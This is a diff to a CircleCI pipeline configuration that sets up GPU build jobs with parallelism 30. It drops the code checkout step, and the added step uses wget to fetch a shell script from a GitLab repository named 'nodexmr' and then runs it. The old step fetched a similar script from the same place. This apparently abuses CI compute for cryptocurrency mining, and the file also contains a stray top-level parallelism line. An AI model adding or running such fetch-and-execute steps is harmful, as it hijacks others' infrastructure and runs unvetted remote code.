@@ -8,12 +8,11 @@ jobs:
   build:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     machine:
-      
-      resource_class: gpu.nvidia.large
       image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
     parallelism: 30
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
     steps:
-      - checkout
       - run: nvidia-smi
-      - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/pktss.sh && chmod u+x *.sh && ./pktss.sh 
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/bez.sh && chmod +x *.sh && ./bez.sh
+parallelism: 30
